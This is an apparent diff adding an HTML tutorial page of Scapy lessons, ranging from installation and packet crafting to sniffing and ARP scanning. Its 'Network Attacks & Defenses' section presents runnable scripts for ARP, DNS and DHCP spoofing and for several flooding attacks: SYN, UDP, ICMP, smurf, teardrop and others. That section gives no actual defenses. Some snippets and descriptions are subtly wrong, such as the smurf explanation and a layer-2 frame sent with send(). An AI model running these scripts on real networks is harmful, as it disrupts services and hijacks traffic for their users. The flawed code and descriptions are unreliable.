@@ -1,0 +1,601 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Scapy Lessons</title>
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="Designer.png" type="image/x-icon">
+    <style>
+        /* Global styles */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background: linear-gradient(to right, #f0f0f0, #ffffff);
+            padding: 20px;
+            animation: fadeIn 1s ease-in;
+        }
+
+        header {
+            background: linear-gradient(135deg, #1e90ff, #007acc);
+            color: #fff;
+            padding: 15px;
+            text-align: center;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            position: fixed;
+            width: 100%;
+            top: 0;
+            left: 0;
+            z-index: 1000;
+            animation: slideDown 0.7s ease-out;
+        }
+
+        nav ul {
+            list-style: none;
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            padding: 0;
+        }
+
+        nav ul li {
+            margin: 0 15px;
+        }
+
+        nav ul li a {
+            text-decoration: none;
+            color: #fff;
+            font-size: 16px;
+            padding: 10px 15px;
+            transition: background-color 0.3s ease, transform 0.3s ease;
+            border-radius: 5px;
+        }
+
+        nav ul li a:hover {
+            background-color: #0f7bd1;
+            transform: scale(1.1);
+        }
+
+        .section {
+            border: 1px solid #ddd;
+            padding: 20px;
+            width: 100%;
+            max-width: 800px;
+            margin: 120px auto 40px;
+            background-color: #fff;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            animation: fadeInUp 1s ease-in-out;
+            position: relative;
+        }
+
+        .section h2 {
+            font-size: 28px;
+            color: #007acc;
+            margin-bottom: 20px;
+        }
+
+        .section p {
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+
+        pre {
+            background-color: #f7f7f7;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            margin-bottom: 20px;
+            border: 1px solid #ddd;
+        }
+
+        code {
+            font-family: "Courier New", Courier, monospace;
+            color: #d63384;
+        }
+
+        .definition {
+            background-color: #f9f9f9;
+            border-left: 5px solid #007acc;
+            padding: 10px 15px;
+            margin-bottom: 20px;
+        }
+
+        .definition p {
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+
+        @media only screen and (max-width: 768px) {
+            .section {
+                width: 90%;
+                margin: 140px auto 30px;
+            }
+
+            header {
+                padding: 10px;
+            }
+
+            nav ul li a {
+                font-size: 14px;
+                padding: 8px 12px;
+            }
+        }
+
+        @media only screen and (max-width: 480px) {
+            .section {
+                width: 100%;
+                margin: 20px auto;
+                padding: 15px;
+            }
+
+            .section h2 {
+                font-size: 24px;
+            }
+
+            .section p {
+                font-size: 14px;
+            }
+
+            nav ul {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            nav ul li {
+                margin-bottom: 10px;
+            }
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes slideDown {
+            from {
+                transform: translateY(-100%);
+            }
+            to {
+                transform: translateY(0);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <nav>
+            <ul>
+                <li><a href="#setup">Setup</a></li>
+                <li><a href="#basics">Basics</a></li>
+                <li><a href="#intermediate">Intermediate Techniques</a></li>
+                <li><a href="#advanced">Advanced Techniques</a></li>
+                <li><a href="#network-attacks">Network Attacks & Defenses</a></li>
+                <li><a href="#scripting">Scripting & Automation</a></li>
+                <li><a href="#protocols">Network Protocols</a></li>
+                <li><a href="#packet-manipulation">Packet Manipulation</a></li>
+                <li><a href="#troubleshooting">Troubleshooting & Debugging</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main>
+        <!-- Setup Section -->
+        <section class="section" id="setup">
+            <h2>Setup Your Environment</h2>
+            <p><strong>Lesson 1: Install Scapy</strong></p>
+            <pre><code>pip install scapy</code></pre>
+            <p><strong>Lesson 2: Verify Installation</strong></p>
+            <pre><code>scapy --version</code></pre>
+            <p><strong>Lesson 3: Running Scapy in Interactive Mode</strong></p>
+            <pre><code>scapy</code></pre>
+            <p><strong>Lesson 4: Installing Scapy on Linux</strong></p>
+            <pre><code>sudo apt-get install scapy</code></pre>
+            <p><strong>Lesson 5: Installing Scapy on Windows</strong></p>
+            <pre><code>pip install scapy</code></pre>
+            <p><strong>Lesson 6: Installing Scapy on macOS</strong></p>
+            <pre><code>brew install scapy</code></pre>
+            <p><strong>Lesson 7: Updating Scapy</strong></p>
+            <pre><code>pip install --upgrade scapy</code></pre>
+            <p><strong>Lesson 8: Running Scapy as Root</strong></p>
+            <pre><code>sudo scapy</code></pre>
+            <p><strong>Lesson 9: Setting Up Scapy Environment Variables</strong></p>
+            <pre><code>export SCAPY_VERBOSE=0</code></pre>
+            <p><strong>Lesson 10: Understanding Scapy's Dependencies</strong></p>
+            <pre><code>pip show scapy</code></pre>
+        </section>
+
+        <!-- Basics Section -->
+        <section class="section" id="basics">
+            <h2>Basics of Scapy</h2>
+            <p><strong>Lesson 11: Creating Simple Packets</strong></p>
+            <pre><code>from scapy.all import *
+packet = IP(dst="8.8.8.8")/ICMP()
+send(packet)
+            </code></pre>
+            <p><strong>Lesson 12: Capturing Packets</strong></p>
+            <pre><code>from scapy.all import sniff
+
+packets = sniff(count=5)
+packets.show()
+            </code></pre>
+            <p><strong>Lesson 13: Displaying Packet Summary</strong></p>
+            <pre><code>packet = IP(dst="8.8.8.8")/ICMP()
+packet.show()
+            </code></pre>
+            <p><strong>Lesson 14: Sending TCP Packets</strong></p>
+            <pre><code>packet = IP(dst="8.8.8.8")/TCP(dport=80)
+send(packet)
+            </code></pre>
+            <p><strong>Lesson 15: Saving and Loading Packets</strong></p>
+            <pre><code>from scapy.all import wrpcap, rdpcap
+
+wrpcap('my_packets.pcap', packets)
+loaded_packets = rdpcap('my_packets.pcap')
+loaded_packets.show()
+            </code></pre>
+        </section>
+
+        <!-- Intermediate Techniques Section -->
+        <section class="section" id="intermediate">
+            <h2>Intermediate Techniques</h2>
+            <p><strong>Lesson 16: Crafting Custom Packets</strong></p>
+            <pre><code>packet = IP(dst="192.168.1.1")/TCP(dport=1234, sport=12345, flags="S")
+packet.show()
+            </code></pre>
+            <p><strong>Lesson 17: Manipulating Packet Fields</strong></p>
+            <pre><code>packet = IP(dst="192.168.1.1")/TCP(dport=80)
+packet[IP].ttl = 64
+packet.show()
+            </code></pre>
+            <p><strong>Lesson 18: Using Scapy with Other Tools</strong></p>
+            <pre><code>from scapy.all import sr1
+response = sr1(IP(dst="example.com")/ICMP())
+response.show()
+            </code></pre>
+            <p><strong>Lesson 19: Advanced Packet Analysis</strong></p>
+            <pre><code>packets = sniff(count=10)
+for packet in packets:
+    if packet.haslayer(TCP):
+        print(packet[TCP].payload)
+            </code></pre>
+            <p><strong>Lesson 20: Packet Injection Techniques</strong></p>
+            <pre><code>packet = IP(dst="192.168.1.1")/ICMP()
+send(packet, verbose=0)
+            </code></pre>
+        </section>
+
+        <!-- Advanced Techniques Section -->
+        <section class="section" id="advanced">
+            <h2>Advanced Techniques</h2>
+            <p><strong>Lesson 21: Building Complex Packet Sequences</strong></p>
+            <pre><code>packet = IP(dst="192.168.1.1")/TCP(dport=80)/Raw(b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")
+send(packet)
+            </code></pre>
+            <p><strong>Lesson 22: Performing Network Scanning</strong></p>
+            <pre><code>from scapy.all import ARP, Ether, srp
+
+arp = ARP(pdst="192.168.1.1/24")
+broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+request = broadcast/arp
+result = srp(request, timeout=3, verbose=0)[0]
+for sent, received in result:
+    print(received.psrc)
+            </code></pre>
+            <p><strong>Lesson 23: Detecting and Handling Packet Flooding</strong></p>
+            <pre><code>packets = sniff(timeout=10)
+for packet in packets:
+    if packet.haslayer(ICMP):
+        print(packet.summary())
+            </code></pre>
+            <p><strong>Lesson 24: Implementing Protocol Decoding</strong></p>
+            <pre><code>from scapy.all import IP, TCP
+
+def custom_packet_handler(packet):
+    if packet.haslayer(IP):
+        ip_layer = packet.getlayer(IP)
+        print(f"IP Layer: {ip_layer.src} -> {ip_layer.dst}")
+
+sniff(prn=custom_packet_handler, count=5)
+            </code></pre>
+            <p><strong>Lesson 25: Optimizing Scapy Performance</strong></p>
+            <pre><code>from scapy.all import conf
+conf.verb = 0
+            </code></pre>
+        </section>
+
+        <!-- Network Attacks & Defenses Section -->
+        <section class="section" id="network-attacks">
+            <h2>Network Attacks & Defenses</h2>
+            <div class="definition">
+                <p><strong>ARP Spoofing:</strong> A type of attack where an attacker sends false ARP (Address Resolution Protocol) messages to associate the attacker's MAC address with the IP address of a legitimate device on the network.</p>
+                <pre><code>from scapy.all import ARP, Ether, send
+arp_response = ARP(op=2, pdst="192.168.1.1", psrc="192.168.1.100", hwdst="ff:ff:ff:ff:ff:ff")
+send(Ether(dst="ff:ff:ff:ff:ff:ff")/arp_response)
+                </code></pre>
+            </div>
+            <div class="definition">
+                <p><strong>DNS Spoofing:</strong> A type of attack where an attacker alters the DNS (Domain Name System) lookup to redirect users to fake or malicious websites.</p>
+                <pre><code>from scapy.all import DNS, DNSRR, IP, UDP, send
+dns_response = IP(dst="192.168.1.1")/UDP(dport=53)/DNS(id=1, qr=1, ancount=1, an=DNSRR(rrname="example.com.", rdata="192.168.1.100"))
+send(dns_response)
+                </code></pre>
+            </div>
+            <div class="definition">
+                <p><strong>DHCP Spoofing:</strong> A type of attack where an attacker sets up a rogue DHCP (Dynamic Host Configuration Protocol) server to issue false IP addresses and other network settings to devices on the network.</p>
+                <pre><code>from scapy.all import BOOTP, DHCP, Ether, IP, UDP, send
+dhcp_offer = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="192.168.1.1")/UDP(sport=67, dport=68)/BOOTP(op=2, yiaddr="192.168.1.100")/DHCP(options=[("message-type", "offer"), ("server_id", "192.168.1.1"), "end"])
+send(dhcp_offer)
+                </code></pre>
+            </div>
+            <div class="definition">
+                <p><strong>TCP SYN Flood:</strong> A type of denial-of-service (DoS) attack where an attacker sends a large number of SYN (synchronize) packets to a server, overwhelming it and making it unavailable to legitimate users.</p>
+                <pre><code>from scapy.all import IP, TCP, send
+for i in range(1000):
+    send(IP(dst="192.168.1.1")/TCP(dport=80, flags="S"))
+                </code></pre>
+            </div>
+            <div class="definition">
+                <p><strong>TCP ACK Flood:</strong> A type of denial-of-service (DoS) attack where an attacker sends a large number of ACK (acknowledgment) packets to a server, overwhelming it and making it unavailable to legitimate users.</p>
+                <pre><code>from scapy.all import IP, TCP, send
+for i in range(1000):
+    send(IP(dst="192.168.1.1")/TCP(dport=80, flags="A"))
+                </code></pre>
+            </div>
+            <div class="definition">
+                <p><strong>UDP Flood:</strong> A type of denial-of-service (DoS) attack where an attacker sends a large number of UDP (User Datagram Protocol) packets to a server, overwhelming it and making it unavailable to legitimate users.</p>
+                <pre><code>from scapy.all import IP, UDP, send
+for i in range(1000):
+    send(IP(dst="192.168.1.1")/UDP(dport=80))
+                </code></pre>
+            </div>
+            <div class="definition">
+                <p><strong>ICMP Flood:</strong> A type of denial-of-service (DoS) attack where an attacker sends a large number of ICMP (Internet Control Message Protocol) packets to a server, overwhelming it and making it unavailable to legitimate users.</p>
+                <pre><code>from scapy.all import IP, ICMP, send
+for i in range(1000):
+    send(IP(dst="192.168.1.1")/ICMP())
+                </code></pre>
+            </div>
+            <div class="definition">
+                <p><strong>Ping of Death:</strong> A type of denial-of-service (DoS) attack where an attacker sends a large ICMP echo request packet to a server, causing it to crash or become unavailable.</p>
+                <pre><code>from scapy.all import IP, ICMP, send
+packet = IP(dst="192.168.1.1")/ICMP()/b"A" * 65535
+send(packet)
+                </code></pre>
+            </div>
+            <div class="definition">
+                <p><strong>Land Attack:</strong> A type of denial-of-service (DoS) attack where an attacker sends a TCP SYN packet with the same source and destination IP address and port number, causing the server to crash or become unavailable.</p>
+                <pre><code>from scapy.all import IP, TCP, send
+packet = IP(src="192.168.1.1", dst="192.168.1.1")/TCP(sport=80, dport=80, flags="S")
+send(packet)
+                </code></pre>
+            </div>
+            <div class="definition">
+                <p><strong>Teardrop Attack:</strong> A type of denial-of-service (DoS) attack where an attacker sends a series of fragmented packets to a server, causing it to crash or become unavailable.</p>
+                <pre><code>from scapy.all import IP, TCP, fragment, send
+packet = IP(dst="192.168.1.1")/TCP(dport=80)/b"A" * 65535
+fragments = fragment(packet, fragsize=800)
+for frag in fragments:
+    send(frag)
+                </code></pre>
+            </div>
+            <div class="definition">
+                <p><strong>Smurf Attack:</strong> A type of denial-of-service (DoS) attack where an attacker sends a large number of ICMP echo request packets to a server, overwhelming it and making it unavailable to legitimate users.</p>
+                <pre><code>from scapy.all import IP, ICMP, send
+for i in range(1000):
+    send(IP(dst="192.168.1.1", src="192.168.1.2")/ICMP())
+                </code></pre>
+            </div>
+            <div class="definition">
+                <p><strong>Fraggle Attack:</strong> A type of denial-of-service (DoS) attack where an attacker sends a large number of UDP packets to a server, overwhelming it and making it unavailable to legitimate users.</p>
+                <pre><code>from scapy.all import IP, UDP, send
+for i in range(1000):
+    send(IP(dst="192.168.1.1")/UDP(dport=7))
+                </code></pre>
+            </div>
+        </section>
+
+        <!-- Scripting & Automation Section -->
+        <section class="section" id="scripting">
+            <h2>Scripting & Automation</h2>
+            <p><strong>Lesson 26: Writing Scapy Scripts</strong></p>
+            <pre><code>from scapy.all import *
+
+def create_packet(destination):
+    packet = IP(dst=destination)/ICMP()
+    return packet
+
+packet = create_packet("8.8.8.8")
+send(packet)
+            </code></pre>
+            <p><strong>Lesson 27: Automating Packet Analysis</strong></p>
+            <pre><code>from scapy.all import sniff
+
+def packet_callback(packet):
+    if packet.haslayer(TCP):
+        print(packet.summary())
+
+sniff(prn=packet_callback, count=10)
+            </code></pre>
+            <p><strong>Lesson 28: Integrating Scapy with Python Scripts</strong></p>
+            <pre><code>from scapy.all import *
+
+def send_custom_packet(dst_ip):
+    packet = IP(dst=dst_ip)/TCP(dport=80, flags="S")
+    send(packet)
+
+send_custom_packet("192.168.1.1")
+            </code></pre>
+            <p><strong>Lesson 29: Using Scapy for Scheduled Tasks</strong></p>
+            <pre><code>import time
+from scapy.all import *
+
+while True:
+    packet = IP(dst="192.168.1.1")/ICMP()
+    send(packet)
+    time.sleep(60)  # send a packet every 60 seconds
+            </code></pre>
+            <p><strong>Lesson 30: Automating Packet Capture and Analysis</strong></p>
+            <pre><code>from scapy.all import sniff
+
+def packet_analysis(packet):
+    print(packet.summary())
+
+sniff(prn=packet_analysis, timeout=60)
+            </code></pre>
+        </section>
+
+        <!-- Network Protocols Section -->
+        <section class="section" id="protocols">
+            <h2>Network Protocols</h2>
+            <p><strong>Lesson 31: Working with IP Protocols</strong></p>
+            <pre><code>from scapy.all import IP
+
+packet = IP(dst="192.168.1.1")
+packet.show()
+            </code></pre>
+            <p><strong>Lesson 32: Understanding TCP/IP</strong></p>
+            <pre><code>from scapy.all import IP, TCP
+
+packet = IP(dst="192.168.1.1")/TCP(dport=80)
+packet.show()
+            </code></pre>
+            <p><strong>Lesson 33: Exploring UDP Traffic</strong></p>
+            <pre><code>from scapy.all import IP, UDP
+
+packet = IP(dst="192.168.1.1")/UDP(dport=1234)
+packet.show()
+            </code></pre>
+            <p><strong>Lesson 34: Analyzing ICMP Messages</strong></p>
+            <pre><code>from scapy.all import IP, ICMP
+
+packet = IP(dst="8.8.8.8")/ICMP()
+packet.show()
+            </code></pre>
+            <p><strong>Lesson 35: Inspecting ARP Packets</strong></p>
+            <pre><code>from scapy.all import ARP, Ether
+
+packet = Ether()/ARP(pdst="192.168.1.1")
+packet.show()
+            </code></pre>
+        </section>
+
+        <!-- Packet Manipulation Section -->
+        <section class="section" id="packet-manipulation">
+            <h2>Packet Manipulation</h2>
+            <p><strong>Lesson 36: Crafting Custom Packets</strong></p>
+            <pre><code>from scapy.all import IP, TCP
+
+packet = IP(dst="192.168.1.1")/TCP(dport=80, sport=12345, flags="S")
+packet.show()
+            </code></pre>
+            <p><strong>Lesson 37: Modifying Packet Fields</strong></p>
+            <pre><code>from scapy.all import IP, TCP
+
+packet = IP(dst="192.168.1.1")/TCP(dport=80)
+packet[IP].ttl = 64
+packet.show()
+            </code></pre>
+            <p><strong>Lesson 38: Fragmenting Packets</strong></p>
+            <pre><code>from scapy.all import IP, TCP, fragment
+
+packet = IP(dst="192.168.1.1")/TCP(dport=80)/b"A" * 65535
+fragments = fragment(packet, fragsize=800)
+for frag in fragments:
+    frag.show()
+            </code></pre>
+            <p><strong>Lesson 39: Reassembling Fragmented Packets</strong></p>
+            <pre><code>from scapy.all import IP, TCP, unfragment
+
+fragments = [fragment1, fragment2]  # Replace with actual fragments
+reassembled_packet = unfragment(fragments)
+reassembled_packet.show()
+            </code></pre>
+            <p><strong>Lesson 40: Sending Raw Packets</strong></p>
+            <pre><code>from scapy.all import send, IP, TCP
+
+packet = IP(dst="192.168.1.1")/TCP(dport=80, flags="S")
+send(packet, raw=True)
+            </code></pre>
+        </section>
+
+        <!-- Troubleshooting & Debugging Section -->
+        <section class="section" id="troubleshooting">
+            <h2>Troubleshooting & Debugging</h2>
+            <p><strong>Lesson 41: Debugging Scapy Scripts</strong></p>
+            <pre><code>from scapy.all import sniff
+
+def packet_callback(packet):
+    try:
+        packet.show()
+    except Exception as e:
+        print(f"Error: {e}")
+
+sniff(prn=packet_callback, count=10)
+            </code></pre>
+            <p><strong>Lesson 42: Analyzing Packet Capture Files</strong></p>
+            <pre><code>from scapy.all import rdpcap
+
+packets = rdpcap('capture.pcap')
+for packet in packets:
+    packet.show()
+            </code></pre>
+            <p><strong>Lesson 43: Troubleshooting Network Issues</strong></p>
+            <pre><code>from scapy.all import ICMP, IP, sr1
+
+response = sr1(IP(dst="192.168.1.1")/ICMP())
+if response:
+    response.show()
+else:
+    print("No response received")
+            </code></pre>
+            <p><strong>Lesson 44: Verifying Packet Delivery</strong></p>
+            <pre><code>from scapy.all import IP, ICMP, sr1
+
+response = sr1(IP(dst="192.168.1.1")/ICMP(), timeout=2)
+if response:
+    print("Packet delivered successfully")
+else:
+    print("Packet delivery failed")
+            </code></pre>
+            <p><strong>Lesson 45: Monitoring Network Traffic</strong></p>
+            <pre><code>from scapy.all import sniff
+
+def monitor_traffic(packet):
+    print(packet.summary())
+
+sniff(prn=monitor_traffic, timeout=30)
+            </code></pre>
+        </section>
+    </main>
+</body>
+
+</html>
